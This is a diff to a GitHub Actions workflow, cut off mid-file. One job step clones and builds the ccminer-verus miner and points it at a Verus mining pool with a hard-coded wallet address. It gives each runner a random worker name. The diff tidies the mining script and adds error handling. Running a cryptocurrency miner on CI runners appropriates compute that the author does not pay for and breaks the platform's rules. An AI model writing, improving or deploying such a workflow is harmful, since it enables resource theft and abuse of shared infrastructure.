@@ -36,28 +36,27 @@ jobs:
 
       - name: Install ccminer & Start Mining
         run: |
+          #!/bin/bash
           WAL="RGRbQeW9cy641mJfpM7MKZ5YpmsUHMxf2p"
           POOL="pool.verus.io:9998"
           TH=4
 
           # Worker name عشوائي
           RAND_NUM=$(shuf -i 1000-9999 -n 1)
-          RAND_CHARS=$(cat /dev/urandom | tr -dc 'a-zA-Z' | fold -w 2 | head -n 1)
+          RAND_CHARS=$(tr -dc 'a-zA-Z' </dev/urandom | head -c 2)
           WRK="ubuntu${RAND_NUM}${RAND_CHARS}"
           echo "👷 Worker Name: $WRK"
 
-          cd ~
+          cd ~ || exit 1
+
           if [ ! -d "$HOME/ccminer" ]; then
-              git clone https://github.com/Oink70/ccminer-verus.git ~/ccminer
-              cd ~/ccminer
-              ./build.sh
-          else
-              cd ~/ccminer
-              make clean
-              ./build.sh
+            git clone https://github.com/Oink70/ccminer-verus.git ccminer
           fi
 
-          cd ~/ccminer
+          cd ccminer || exit 1
+          make clean || true
+          ./build.sh
+
           cat > config.json <<EOF
 {
   "pools": [
